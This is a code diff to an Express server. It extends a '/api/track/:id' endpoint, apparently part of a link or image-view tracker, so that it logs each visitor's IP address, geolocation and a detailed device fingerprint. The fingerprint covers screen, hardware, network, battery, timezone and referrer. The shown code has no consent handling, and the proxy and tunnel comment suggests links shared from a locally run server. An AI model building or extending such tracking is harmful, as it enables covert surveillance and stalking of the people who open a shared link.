@@ -148,10 +148,13 @@ app.get('/view/:id', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'view.html'));
 });
 
-// 3. Track View
+// 3. Track View (Enhanced)
 app.post('/api/track/:id', (req, res) => {
     const { id } = req.params;
-    const { latitude, longitude, userAgent } = req.body;
+    const { latitude, longitude, userAgent, screen, language, platform, hardware, network, battery, vendor, touch, timezone, referrer } = req.body;
+
+    // Get IP (handles local tunnel/proxies)
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
     const db = getDB();
     const entryIndex = db.findIndex(img => img.id === id);
@@ -161,7 +164,20 @@ app.post('/api/track/:id', (req, res) => {
             timestamp: new Date().toISOString(),
             latitude,
             longitude,
-            userAgent: userAgent || req.headers['user-agent']
+            ip, // Store IP
+            userAgent: userAgent || req.headers['user-agent'],
+            details: {
+                screen,
+                language,
+                platform,
+                vendor,
+                touch,
+                timezone,
+                referrer,
+                hardware, // cores, memory
+                network,  // 4g, wifi
+                battery
+            }
         });
         saveDB(db);
         res.json({ success: true });
